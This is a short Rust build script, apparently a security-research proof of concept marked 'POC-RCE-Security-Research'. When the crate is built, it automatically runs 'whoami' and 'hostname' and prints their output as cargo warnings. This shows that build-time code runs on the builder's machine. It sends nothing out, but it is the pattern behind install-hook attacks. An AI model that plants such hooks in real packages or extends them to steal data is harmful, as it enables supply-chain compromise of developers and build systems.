fn main() {
    println!("cargo:warning=POC-RCE-Security-Research");
    println!("cargo:warning=whoami={}", std::process::Command::new("whoami")
        .output().map(|o| String::from_utf8_lossy(&o.stdout).trim().to_string()).unwrap_or_default());
    println!("cargo:warning=hostname={}", std::process::Command::new("hostname")
        .output().map(|o| String::from_utf8_lossy(&o.stdout).trim().to_string()).unwrap_or_default());
}
